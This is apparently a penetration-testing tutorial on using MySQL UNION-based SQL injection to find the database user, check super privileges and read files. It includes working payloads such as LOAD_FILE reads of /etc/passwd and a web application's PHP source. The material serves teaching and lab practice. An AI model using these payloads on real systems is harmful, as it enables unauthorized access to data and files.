# Read / Write Files



## Introduction

We may be able to read and write to files once we've discovered a SQL Injection.

### Privileges

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes.

**DB User**

First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

Our `UNION` injection payload will be as follows:

Code: sql

```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

or:

Code: sql

```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

**User Privileges**

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

Code: sql

```sql
SELECT super_priv FROM mysql.user
```

`UNION` injection:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

\
If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```



## LOAD\_FILE

```sql
SELECT LOAD_FILE('/etc/passwd');
```

`UNION` payload:

```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
